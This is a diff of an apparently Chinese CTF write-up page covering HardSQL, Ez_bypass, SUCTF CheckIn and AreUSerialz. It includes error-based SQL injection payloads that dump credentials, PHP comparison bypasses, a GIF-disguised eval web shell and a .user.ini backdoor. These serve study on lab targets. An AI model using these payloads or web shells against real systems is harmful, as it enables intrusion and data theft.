-<span class="meta">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+class Flag&#123;  &#x2F;&#x2F;flag.php  
+    public $file;  
+    public function __tostring()&#123;  
+        if(isset($this-&gt;file))&#123;  
+            echo file_get_contents($this-&gt;file); 
+            echo &quot;&lt;br&gt;&quot;;
+        return (&quot;U R SO CLOSE !&#x2F;&#x2F;&#x2F;COME ON PLZ&quot;);
+        &#125;  
+    &#125;  
+&#125;  
+?&gt;  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">再结合主页面的unserialize()函数，显然我们需要将这个进行序列化</p>
 <p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041807656.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p>
@@ -980,90 +977,90 @@ O%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="nu
 <h2 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h2><h3 id="一、本题做题思路-19"><a href="#一、本题做题思路-19" class="headerlink" title="一、本题做题思路"></a>一、本题做题思路</h3><p> SQL注入，先看是什么闭合方式</p>
 <p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041808245.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041808154.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">确定为’闭合。<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041808161.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">union被过滤掉 ，还有空格也被过滤，所以我们需要使用括号绕过，但同时这道题没有过滤extractvalue。所以我们可以尝试用这来解决问题</p>
 <p><strong>获取数据库名</strong></p>
-<pre class="line-numbers language-highlight php">username=<span class="number">1</span><span class="string"><code class="language-highlight php">username=<span class="number">1</span><span class="string">&#x27;^extractvalue(1,concat(0x7e,(select(database()))))%23&password=1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">username&#x3D;1&#39;^extractvalue(1,concat(0x7e,(select(database()))))%23&amp;password&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041808227.png"></p>
 <p> <strong>爆破表名得到字段名</strong> </p>
-<pre class="line-numbers language-highlight php">username=<span class="number">1</span><span class="string">&#x27;^extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(&#x27;</span>geek<span class="string"><code class="language-highlight php">username=<span class="number">1</span><span class="string">&#x27;^extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(&#x27;</span>geek<span class="string">&#x27;))))%23&password=1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">username&#x3D;1&#39;^extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(&#39;geek&#39;))))%23&amp;password&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="><img src="https://img-blog.csdnimg.cn/16f5b94d16224701aa37757f559c599e.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="> <strong>查看字段名内内容</strong></p>
-<pre class="line-numbers language-highlight php">username=<span class="number">1</span><span class="string">&#x27;^extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#x27;</span>H4rDsq1<span class="string"><code class="language-highlight php">username=<span class="number">1</span><span class="string">&#x27;^extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#x27;</span>H4rDsq1<span class="string">&#x27;))))%23&password=1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">username&#x3D;1&#39;^extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#39;H4rDsq1&#39;))))%23&amp;password&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041808264.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="> <strong>获取用户名和密码，出现一部分flag</strong></p>
-<pre class="line-numbers language-highlight php">/check.php?username=<span class="number">1</span><span class="string"><code class="language-highlight php">/check.php?username=<span class="number">1</span><span class="string">&#x27;^extractvalue(1,concat(0x7e,(select(group_concat(password))from(H4rDsq1))))%23&password=1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">&#x2F;check.php?username&#x3D;1&#39;^extractvalue(1,concat(0x7e,(select(group_concat(password))from(H4rDsq1))))%23&amp;password&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041808731.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">然后可以使用left()和right()函数进行拼接，这里直接使用right函数，然后再把重复的删去组成flag</p>
-<pre class="line-numbers language-highlight php">username=<span class="number">1</span><span class="string"><code class="language-highlight php">username=<span class="number">1</span><span class="string">&#x27;^extractvalue(1,concat(0x7e,(select(group_concat(right(password,20)))from(H4rDsq1))))%23&password=1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">username&#x3D;1&#39;^extractvalue(1,concat(0x7e,(select(group_concat(right(password,20)))from(H4rDsq1))))%23&amp;password&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041808951.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="> 去掉重复的即为最终的flag答案。</p>
 <h2 id="MRCTF2020-Ez-bypass"><a href="#MRCTF2020-Ez-bypass" class="headerlink" title="[MRCTF2020]Ez_bypass"></a>[MRCTF2020]Ez_bypass</h2><h3 id="一、本题做题思路-20"><a href="#一、本题做题思路-20" class="headerlink" title="一、本题做题思路"></a>一、本题做题思路</h3><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041810758.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">代码如下 </p>
-<pre class="line-numbers language-highlight php"><span class="keyword">include</span> <span class="string"><code class="language-highlight php"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;
-<span class="variable">$flag</span>=<span class="string">&#x27;MRCTF{xxxxxxxxxxxxxxxxxxxxxxxxx}&#x27;</span>;
-<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;gg&#x27;</span>])&&<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>])) {
-    <span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];
-    <span class="variable">$gg</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;gg&#x27;</span>];
-    <span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$id</span>) === <span class="title function_ invoke__">md5</span>(<span class="variable">$gg</span>) && <span class="variable">$id</span> !== <span class="variable">$gg</span>) {<span class="comment">//md5强等于绕过</span>
-        <span class="keyword">echo</span> <span class="string">&#x27;You got the first step&#x27;</span>;
-        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>])) {
-            <span class="variable">$passwd</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>];
-            <span class="keyword">if</span> (!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$passwd</span>))<span class="comment">//$passwd不能是数字</span>
-            {
-                 <span class="keyword">if</span>(<span class="variable">$passwd</span>==<span class="number">1234567</span>)<span class="comment">//弱等于为1234567</span>
-                 {
-                     <span class="keyword">echo</span> <span class="string">&#x27;Good Job!&#x27;</span>;
-                     <span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;flag.php&#x27;</span>);
-                     <span class="keyword">die</span>(<span class="string">&#x27;By Retr_0&#x27;</span>);
-                 }
-                 <span class="keyword">else</span>
-                 {
-                     <span class="keyword">echo</span> <span class="string">"can you think twice??"</span>;
-                 }
-            }
-            <span class="keyword">else</span>{
-                <span class="keyword">echo</span> <span class="string">&#x27;You can not get it !&#x27;</span>;
-            }
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">include &#39;flag.php&#39;;
+$flag&#x3D;&#39;MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#39;;
+if(isset($_GET[&#39;gg&#39;])&amp;&amp;isset($_GET[&#39;id&#39;])) &#123;
+    $id&#x3D;$_GET[&#39;id&#39;];
+    $gg&#x3D;$_GET[&#39;gg&#39;];
+    if (md5($id) &#x3D;&#x3D;&#x3D; md5($gg) &amp;&amp; $id !&#x3D;&#x3D; $gg) &#123;&#x2F;&#x2F;md5强等于绕过
+        echo &#39;You got the first step&#39;;
+        if(isset($_POST[&#39;passwd&#39;])) &#123;
+            $passwd&#x3D;$_POST[&#39;passwd&#39;];
+            if (!is_numeric($passwd))&#x2F;&#x2F;$passwd不能是数字
+            &#123;
+                 if($passwd&#x3D;&#x3D;1234567)&#x2F;&#x2F;弱等于为1234567
+                 &#123;
+                     echo &#39;Good Job!&#39;;
+                     highlight_file(&#39;flag.php&#39;);
+                     die(&#39;By Retr_0&#39;);
+                 &#125;
+                 else
+                 &#123;
+                     echo &quot;can you think twice??&quot;;
+                 &#125;
+            &#125;
+            else&#123;
+                echo &#39;You can not get it !&#39;;
+            &#125;
 
-        }
-        <span class="keyword">else</span>{
-            <span class="keyword">die</span>(<span class="string">&#x27;only one way to get the flag&#x27;</span>);
-        }
-}
-    <span class="keyword">else</span> {
-        <span class="keyword">echo</span> <span class="string">"You are not a real hacker!"</span>;
-    }
-}
-<span class="keyword">else</span>{
-    <span class="keyword">die</span>(<span class="string">&#x27;Please input first&#x27;</span>);
-}
-}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+        &#125;
+        else&#123;
+            die(&#39;only one way to get the flag&#39;);
+        &#125;
+&#125;
+    else &#123;
+        echo &quot;You are not a real hacker!&quot;;
+    &#125;
+&#125;
+else&#123;
+    die(&#39;Please input first&#39;);
+&#125;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">先走第一步，MD5强等于绕过，即数组绕过</p>
 <p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041810784.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">再说明POST传参$passwd不是数字且弱等于1234567。所以我们可以在1234567后加一个英文字母。<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041810839.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="> 得到flag</p>
 <h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><h2 id="一、本题做题思路-21"><a href="#一、本题做题思路-21" class="headerlink" title="一、本题做题思路"></a>一、本题做题思路</h2><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041811560.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">一道上传题，先试试PHP。回显非法后缀，看来又是要靠图片来绕过了</p>
 <p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041811555.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">上传图片后发现，此题还对文件内容有所要求</p>
 <p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041811515.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">所以我们上传图片文件里不能用平常的一句话木马，要换为如下的</p>
-<pre class="line-numbers language-highlight php">&lt;script language=<span class="string">&#x27;php&#x27;</span>&gt;<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string"><code class="language-highlight php">&lt;script language=<span class="string">&#x27;php&#x27;</span>&gt;<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;shell&#x27;</span>]);</script><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;script language&#x3D;&#39;php&#39;&gt;eval($_POST[&#39;shell&#39;]);&lt;&#x2F;script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">再次尝试一下。</p>
 <p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041811541.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="> 出现新的回显，说这不是图片。所以又需要用到我们的图片幻术头</p>
-<pre class="line-numbers language-highlight php"><code class="language-highlight php">GIF89a
-<script language=<span class="string">&#x27;php&#x27;</span>><span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ru&#x27;</span>]);</script><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">GIF89a
+&lt;script language&#x3D;&#39;php&#39;&gt;eval($_POST[&#39;ru&#39;]);&lt;&#x2F;script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
 <p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">得到回显</p>
 <p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041811572.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="> 这不就跟我们上面一道题长的一样了么。所以构造payload,不过我们需要对图片内容修改一下，将其POST传入改为GET传入，要记得上传一个.user.ini文件，文件内容在下面写了。</p>
-<pre class="line-numbers language-highlight php"><code class="language-highlight php">GIF89a?
-<script language=<span class="string">&#x27;php&#x27;</span>><span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>]);</script><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">GIF89a?
+&lt;script language&#x3D;&#39;php&#39;&gt;eval($_GET[&#39;shell&#39;]);&lt;&#x2F;script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
 <p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041811544.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p>
-<pre class="line-numbers language-highlight php">payload为 ：  url+/uploads/f9e1016a5cec370aae6a18d438dabfa5/index.php?shell=<span class="title function_ invoke__">print_r</span>(<span class="string"><code class="language-highlight php">payload为 ：  url+/uploads/f9e1016a5cec370aae6a18d438dabfa5/index.php?shell=<span class="title function_ invoke__">print_r</span>(<span class="string">"/"</span>);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">payload为 ：  url+&#x2F;uploads&#x2F;f9e1016a5cec370aae6a18d438dabfa5&#x2F;index.php?shell&#x3D;print_r(&quot;&#x2F;&quot;);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">然后通过cat来抓取flag</p>
-<pre class="line-numbers language-highlight php">/payload为 ：  url+/uploads/f9e1016a5cec370aae6a18d438dabfa5/index.php?shell=<span class="title function_ invoke__">system</span>(<span class="string"><code class="language-highlight php">/payload为 ：  url+/uploads/f9e1016a5cec370aae6a18d438dabfa5/index.php?shell=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat /flag&#x27;</span>);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">&#x2F;payload为 ：  url+&#x2F;uploads&#x2F;f9e1016a5cec370aae6a18d438dabfa5&#x2F;index.php?shell&#x3D;system(&#39;cat &#x2F;flag&#39;);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041811006.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">或者通过蚁剑抓包</p>
 <p>先传一个.user.ini文件，文件内容如下</p>
-<pre class="line-numbers language-highlight php"><code class="language-highlight php">GIF89a
-auto_prepend_file=xiaoma.jpg<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">GIF89a
+auto_prepend_file&#x3D;xiaoma.jpg<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
 <p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">然后再传入这个xiaoma.jpg</p>
 <p>最后在蚁剑上连接</p>
@@ -1071,102 +1068,102 @@ auto_prepend_file=xiaoma.jpg<span aria-hidden="true" class="line-numbers-rows"><
 <p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041811062.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p>
 <h3 id="二、本题知识点-11"><a href="#二、本题知识点-11" class="headerlink" title="二、本题知识点"></a>二、本题知识点</h3><p>.user.ini留后门  <strong>使.user.ini指定文件，在其当前目录下的文件执行时会将你指定的文件中的代码执行出来，以此带入后门。</strong></p>
 <h2 id="网鼎杯-2020-青龙组-AreUSerialz"><a href="#网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="[网鼎杯 2020 青龙组]AreUSerialz"></a>[网鼎杯 2020 青龙组]AreUSerialz</h2><h3 id="一、本题做题思路-22"><a href="#一、本题做题思路-22" class="headerlink" title="一、本题做题思路"></a>一、本题做题思路</h3><p>本题是一道代码审计题，代码如下：</p>
-<pre class="line-numbers language-highlight php"><span class="meta"><code class="language-highlight php"><span class="meta"><?php</span>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
 
-<span class="keyword">include</span>(<span class="string">"flag.php"</span>);
+include(&quot;flag.php&quot;);
 
-<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
+highlight_file(__FILE__);
 
-<span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>{
+class FileHandler &#123;
 
-    <span class="keyword">protected</span> <span class="variable">$op</span>;
-    <span class="keyword">protected</span> <span class="variable">$filename</span>;
-    <span class="keyword">protected</span> <span class="variable">$content</span>;
+    protected $op;
+    protected $filename;
+    protected $content;
 
-    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>{
-        <span class="variable">$op</span> = <span class="string">"1"</span>;
-        <span class="variable">$filename</span> = <span class="string">"/tmp/tmpfile"</span>;
-        <span class="variable">$content</span> = <span class="string">"Hello World!"</span>;
-        <span class="variable language_">$this</span>-><span class="title function_ invoke__">process</span>();
-    }
+    function __construct() &#123;
+        $op &#x3D; &quot;1&quot;;
+        $filename &#x3D; &quot;&#x2F;tmp&#x2F;tmpfile&quot;;
+        $content &#x3D; &quot;Hello World!&quot;;
+        $this-&gt;process();
+    &#125;
 
-    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span>(<span class="params"></span>) </span>{
-        <span class="keyword">if</span>(<span class="variable language_">$this</span>->op == <span class="string">"1"</span>) {
-            <span class="variable language_">$this</span>-><span class="title function_ invoke__">write</span>();
-        } <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable language_">$this</span>->op == <span class="string">"2"</span>) {<span class="comment">//判断op是弱等于字符串1还是弱等于字符串2</span>
-            <span class="variable">$res</span> = <span class="variable language_">$this</span>-><span class="title function_ invoke__">read</span>();
-            <span class="variable language_">$this</span>-><span class="title function_ invoke__">output</span>(<span class="variable">$res</span>);<span class="comment">//如果弱等于字符串2，就转向read()和output()函数</span>
-        } <span class="keyword">else</span> {
-            <span class="variable language_">$this</span>-><span class="title function_ invoke__">output</span>(<span class="string">"Bad Hacker!"</span>);
-        }
-    }
+    public function process() &#123;
+        if($this-&gt;op &#x3D;&#x3D; &quot;1&quot;) &#123;
+            $this-&gt;write();
+        &#125; else if($this-&gt;op &#x3D;&#x3D; &quot;2&quot;) &#123;&#x2F;&#x2F;判断op是弱等于字符串1还是弱等于字符串2
+            $res &#x3D; $this-&gt;read();
+            $this-&gt;output($res);&#x2F;&#x2F;如果弱等于字符串2，就转向read()和output()函数
+        &#125; else &#123;
+            $this-&gt;output(&quot;Bad Hacker!&quot;);
+        &#125;
+    &#125;
 
-    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"></span>) </span>{
-        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>->filename) && <span class="keyword">isset</span>(<span class="variable language_">$this</span>->content)) {
-            <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>((<span class="keyword">string</span>)<span class="variable language_">$this</span>->content) > <span class="number">100</span>) {
-                <span class="variable language_">$this</span>-><span class="title function_ invoke__">output</span>(<span class="string">"Too long!"</span>);
-                <span class="keyword">die</span>();
-            }
-            <span class="variable">$res</span> = <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>->filename, <span class="variable">$this</span>->content);
-            <span class="keyword">if</span>(<span class="variable">$res</span>) <span class="variable language_">$this</span>-><span class="title function_ invoke__">output</span>(<span class="string">"Successful!"</span>);
-            <span class="keyword">else</span> <span class="variable language_">$this</span>-><span class="title function_ invoke__">output</span>(<span class="string">"Failed!"</span>);
-        } <span class="keyword">else</span> {
-            <span class="variable language_">$this</span>-><span class="title function_ invoke__">output</span>(<span class="string">"Failed!"</span>);
-        }
-    }
+    private function write() &#123;
+        if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) &#123;
+            if(strlen((string)$this-&gt;content) &gt; 100) &#123;
+                $this-&gt;output(&quot;Too long!&quot;);
+                die();
+            &#125;
+            $res &#x3D; file_put_contents($this-&gt;filename, $this-&gt;content);
+            if($res) $this-&gt;output(&quot;Successful!&quot;);
+            else $this-&gt;output(&quot;Failed!&quot;);
+        &#125; else &#123;
+            $this-&gt;output(&quot;Failed!&quot;);
+        &#125;
+    &#125;
 
-    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>) </span>{
-        <span class="variable">$res</span> = <span class="string">""</span>;
-        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>->filename)) {
-            <span class="variable">$res</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>->filename);<span class="comment">//读取文件路径</span>
-        }
-        <span class="keyword">return</span> <span class="variable">$res</span>;
-    }
+    private function read() &#123;
+        $res &#x3D; &quot;&quot;;
+        if(isset($this-&gt;filename)) &#123;
+            $res &#x3D; file_get_contents($this-&gt;filename);&#x2F;&#x2F;读取文件路径
+        &#125;
+        return $res;
+    &#125;
 
-    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span>(<span class="params"><span class="variable">$s</span></span>) </span>{
-        <span class="keyword">echo</span> <span class="string">"[Result]: <br>"</span>;<span class="comment">//得出结果</span>
-        <span class="keyword">echo</span> <span class="variable">$s</span>;
-    }
+    private function output($s) &#123;
+        echo &quot;[Result]: &lt;br&gt;&quot;;&#x2F;&#x2F;得出结果
+        echo $s;
+    &#125;
 
-    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>{
-        <span class="keyword">if</span>(<span class="variable language_">$this</span>->op === <span class="string">"2"</span>)<span class="comment">//如果op强等于字符串2，则将op等于字符串1，然后执行process()。</span>
-            <span class="variable language_">$this</span>->op = <span class="string">"1"</span>;
-        <span class="variable language_">$this</span>->content = <span class="string">""</span>;
-        <span class="variable language_">$this</span>-><span class="title function_ invoke__">process</span>();
-    }
+    function __destruct() &#123;
+        if($this-&gt;op &#x3D;&#x3D;&#x3D; &quot;2&quot;)&#x2F;&#x2F;如果op强等于字符串2，则将op等于字符串1，然后执行process()。
+            $this-&gt;op &#x3D; &quot;1&quot;;
+        $this-&gt;content &#x3D; &quot;&quot;;
+        $this-&gt;process();
+    &#125;
 
-}
+&#125;
 
-<span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params"><span class="variable">$s</span></span>) </span>{
-    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> < <span class="title function_ invoke__">strlen</span>(<span class="variable">$s</span>); <span class="variable">$i</span>++)
-        <span class="keyword">if</span>(!(<span class="title function_ invoke__">ord</span>(<span class="variable">$s</span>[<span class="variable">$i</span>]) >= <span class="number">32</span> && <span class="title function_ invoke__">ord</span>(<span class="variable">$s</span>[<span class="variable">$i</span>]) <= <span class="number">125</span>))
-            <span class="keyword">return</span> <span class="literal">false</span>;
-    <span class="keyword">return</span> <span class="literal">true</span>;
-}
+function is_valid($s) &#123;
+    for($i &#x3D; 0; $i &lt; strlen($s); $i++)
+        if(!(ord($s[$i]) &gt;&#x3D; 32 &amp;&amp; ord($s[$i]) &lt;&#x3D; 125))
+            return false;
+    return true;
+&#125;
 
-<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>{<span class="string">&#x27;str&#x27;</span>})) {
+if(isset($_GET&#123;&#39;str&#39;&#125;)) &#123;
 
-    <span class="variable">$str</span> = (<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>];
-    <span class="keyword">if</span>(<span class="title function_ invoke__">is_valid</span>(<span class="variable">$str</span>)) {
-        <span class="variable">$obj</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$str</span>);
